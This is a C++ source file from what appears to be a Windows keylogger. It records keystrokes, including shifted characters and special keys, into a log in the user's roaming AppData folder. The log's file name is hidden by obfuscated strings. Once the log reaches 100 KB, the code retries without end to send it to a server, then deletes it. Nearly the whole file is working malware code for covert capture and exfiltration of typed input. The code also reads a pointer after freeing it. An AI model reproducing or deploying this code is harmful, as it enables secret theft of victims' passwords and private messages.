#include "stdafx.h"
#include "keylogger.h"
#include "sendfile.h"
#include "obfuscate.h"

int fileNumber = 0;
int foo = 1;
std::string path;

// get the size a file
std::fstream::pos_type fileSize(const char* filename)
{
	std::ifstream in(filename, std::ios::binary | std::ios::ate);
	return in.tellg();
}

// write to file
void writeData(std::string text)
{
	if (foo == 1)
	{
		wchar_t* localAppData = 0;
		SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &localAppData);
		CoTaskMemFree(static_cast<void*>(localAppData));
		while (*localAppData)
		{
			path += (char)*localAppData++;
		}
		foo--;
	}

	std::string file = path + obf::decode("\xf2\xd7\xc3\xf2\xf5\xc1\xe3\xd9\xca").c_str() + std::to_string(fileNumber) + obf::decode("\x80\xff\xd0\xe3").c_str();

	//FILE* logFile;
	//logFile = fopen(file.c_str(), "a");
	//fprintf(logFile, text.c_str());
	//fclose(logFile);

	std::ofstream logFile;
	logFile.open(file, std::fstream::app);
	logFile << text;
	logFile.close();

	// send file to server if file >= 100kb
	std::fstream::pos_type size = fileSize(file.c_str());
	if (size >= std::streampos(100000))
	{
		// keep trying until the file is sent
		while (1)
		{
			BOOL result = transferFile(file, size);
			if (result)
			{
				remove(file.c_str());
				fileNumber++;
				break;
			}
			else continue;
		}
	}
}

// check if caps key is on/off
bool isCaps() { return ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ? true : false; }
bool isShift() { return ((GetKeyState(VK_SHIFT) & 0x8000) != 0) ? true : false; }

// log special keys
bool isKeyListed(int vkey)
{
	switch (vkey)
	{
	case VK_LBUTTON:
		writeData("");
		return true;
	case VK_RBUTTON:
		writeData("");
		return true;
	case VK_RETURN:
		writeData("\n");
		return true;
	case VK_BACK:
		writeData(" [BACKSPACE] ");
		return true;
	case VK_TAB:
		writeData(" [TAB] ");
		return true;
	case VK_CAPITAL:
		writeData("");
		return true;
	case VK_SPACE:
		writeData(" ");
		return true;
	case VK_PRIOR:
		writeData(" [PAGE UP] ");
		return true;
	case VK_NEXT:
		writeData(" [PAGE DOWN] ");
		return true;
	case VK_END:
		writeData(" [END] ");
		return true;
	case VK_HOME:
		writeData(" [HOME] ");
		return true;
	case VK_LEFT:
		writeData(" [LEFT ARROW] ");
		return true;
	case VK_RIGHT:
		writeData(" [RIGHT ARROW] ");
		return true;
	case VK_UP:
		writeData(" [UP ARROW] ");
		return true;
	case VK_DOWN:
		writeData(" [DOWN ARROW] ");
		return true;
	case VK_SELECT:
		writeData(" [SELECT] ");
		return true;
	case VK_SNAPSHOT:
		writeData(" [PRINT SCREEN] ");
		return true;
	case VK_INSERT:
		writeData(" [INS] ");
		return true;
	case VK_DELETE:
		writeData(" [DEL] ");
		return true;
	case VK_SHIFT:
		writeData(" [SHIFT] ");
		return true;
	case VK_CONTROL:
		writeData(" [CTRL] ");
		return true;
	case VK_LWIN:
		writeData(" [WIN] ");
		return true;
	case VK_NUMLOCK:
		writeData(" [NUM LOCK] ");
		return true;
	case 0x30:
		if (isShift())
			writeData(")");
		else
			writeData("0");
		return true;
	case 0x31:
		if (isShift())
			writeData("!");
		else
			writeData("1");
		return true;
	case 0x32:
		if (isShift())
			writeData("@");
		else
			writeData("2");
		return true;
	case 0x33:
		if (isShift())
			writeData("#");
		else
			writeData("3");
		return true;
	case 0x34:
		if (isShift())
			writeData("$");
		else
			writeData("4");
		return true;
	case 0x35:
		if (isShift())
			writeData("%");
		else
			writeData("5");
		return true;
	case 0x36:
		if (isShift())
			writeData("^");
		else
			writeData("6");
		return true;
	case 0x37:
		if (isShift())
			writeData("&");
		else
			writeData("7");
		return true;
	case 0x38:
		if (isShift())
			writeData("*");
		else
			writeData("8");
		return true;
	case 0x39:
		if (isShift())
			writeData("(");
		else
			writeData("9");
		return true;
	case VK_NUMPAD0:
		writeData("0");
		return true;
	case VK_NUMPAD1:
		writeData("1");
		return true;
	case VK_NUMPAD2:
		writeData("2");
		return true;
	case VK_NUMPAD3:
		writeData("3");
		return true;
	case VK_NUMPAD4:
		writeData("4");
		return true;
	case VK_NUMPAD5:
		writeData("5");
		return true;
	case VK_NUMPAD6:
		writeData("6");
		return true;
	case VK_NUMPAD7:
		writeData("7");
		return true;
	case VK_NUMPAD8:
		writeData("8");
		return true;
	case VK_NUMPAD9:
		writeData("9");
		return true;
	case VK_SLEEP:
		writeData(" [SLEEP] ");
		return true;
	case VK_MULTIPLY:
		writeData("*");
		return true;
	case VK_ADD:
		writeData("+");
		return true;
	case VK_SEPARATOR:
		writeData("|");
		return true;
	case VK_SUBTRACT:
		writeData("-");
		return true;
	case VK_DECIMAL:
		writeData(".");
		return true;
	case VK_DIVIDE:
		writeData("/");
		return true;
	case VK_OEM_1:
		if (isShift())
			writeData(":");
		else
			writeData(";");
		return true;
	case VK_OEM_PLUS:
		if (isShift())
			writeData("+");
		else
			writeData("=");
		return true;
	case VK_OEM_COMMA:
		if (isShift())
			writeData("<");
		else
			writeData(",");
		return true;
	case VK_OEM_MINUS:
		if (isShift())
			writeData("_");
		else
			writeData("-");
		return true;
	case VK_OEM_PERIOD:
		if (isShift())
			writeData(">");
		else
			writeData(".");
		return true;
	case VK_OEM_2:
		if (isShift())
			writeData("?");
		else
			writeData("/");
		return true;
	case VK_OEM_3:
		if (isShift())
			writeData("~");
		else
			writeData("`");
		return true;
	case VK_OEM_4:
		if (isShift())
			writeData("{");
		else
			writeData("[");
		return true;
	case VK_OEM_5:
		if (isShift())
			writeData("|");
		else
			writeData("\\");
		return true;
	case VK_OEM_6:
		if (isShift())
			writeData("}");
		else
			writeData("]");
		return true;
	case VK_OEM_7:
		if (isShift())
			writeData("\"");
		else
			writeData("'");
		return true;
	case VK_F1:
		writeData(" [F1] ");
		return true;
	case VK_F2:
		writeData(" [F2] ");
		return true;
	case VK_F3:
		writeData(" [F3] ");
		return true;
	case VK_F4:
		writeData(" [F4] ");
		return true;
	case VK_F5:
		writeData(" [F5] ");
		return true;
	case VK_F6:
		writeData(" [F6] ");
		return true;
	case VK_F7:
		writeData(" [F7] ");
		return true;
	case VK_F8:
		writeData(" [F8] ");
		return true;
	case VK_F9:
		writeData(" [F9] ");
		return true;
	case VK_F10:
		writeData(" [F10] ");
		return true;
	case VK_F11:
		writeData(" [F11] ");
		return true;
	case VK_F12:
		writeData(" [F12] ");
		return true;
	default:
		return false;
	}
}
